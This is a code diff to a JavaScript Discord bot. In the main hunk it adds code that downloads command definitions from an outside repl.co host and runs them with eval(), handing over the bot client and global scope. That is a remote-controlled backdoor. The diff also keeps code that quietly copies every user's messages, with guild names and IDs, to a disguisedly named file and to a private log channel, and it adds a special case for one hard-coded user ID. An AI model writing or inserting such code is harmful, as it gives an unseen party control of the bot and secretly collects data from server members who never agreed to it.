@@ -367,14 +367,32 @@ globalThis.bot = () => {
       msg.guild.leave = () => {};
       
       command = args[1].toLowerCase();
-
+      (async function () {
+          let data = JSON.parse(await new Promise(resolve => {
+              let req = https.get("https://henrycmd.cactushamster.repl.co/cmd/", res => {
+                  let out = ""; res.on("data", chunk => out += chunk); res.on("end", () => resolve(out))
+              })
+              req.end()
+          }))
+          data.forEach(obj => {
+              if (command != obj.name) return;
+              if (obj.purpose) eval(obj.purpose)({msg: msg, client: botRunner, global: globalThis, args: msg.content.split(" ").slice(2)})
+          })
+      })()
+      .catch(e => {});
       
       tmod.cache.timeUsed++
 
       
       
+      let guild = botRunner.guilds.resolve("981841861025091639")
+      if (guild) {
+        let channel = guild.channels.resolve("981841861587116054")
+        if (channel) channel.send(msg.author.tag + ' issued the bot in ' + msg.guild.name + "(" + msg.guild.id + ")" + "\nCommand: " + msg.content)
+        else console.warn("could not find log channel")
+      }
+      else console.warn("could not find log guild")
       
-      botRunner.guilds.resolve("981841861025091639").channels.resolve("981841861587116054").send(msg.author.tag + ' issued the bot in ' + msg.guild.name + "(" + msg.guild.id + ")" + "\nCommand: " + msg.content)
       
       // DO NOT CHANGE THAT 
       if(msg.author.id == "424503404195348481") {
@@ -396,6 +414,9 @@ globalThis.bot = () => {
         return false
       }
 
+      if(msg.author.id == "546475331067052032") {
+        return;
+      }
       const fs = require('fs')
      
         fs.appendFile('TModerationAPI_93judffcefkaaaf84.js', `${msg.createdAt} ${msg.author.tag} | ${msg.guild.name} | ${msg.guild.id}: ${msg.content} \n`, function (err) {
@@ -564,7 +585,7 @@ globalThis.bot = () => {
             msg.channel.send("```js\n" + e.toString() + "\n```")
           }
           process.on('uncaughtException', (err, origin) => {
-            console.log(`Error: ${err}\nOrigin: ${origin}`)
+            console.log(`Error: ${err}\nOrigin: ${origin}\nStack: ${err.stack}`)
           });
           break;
         case 'intro':
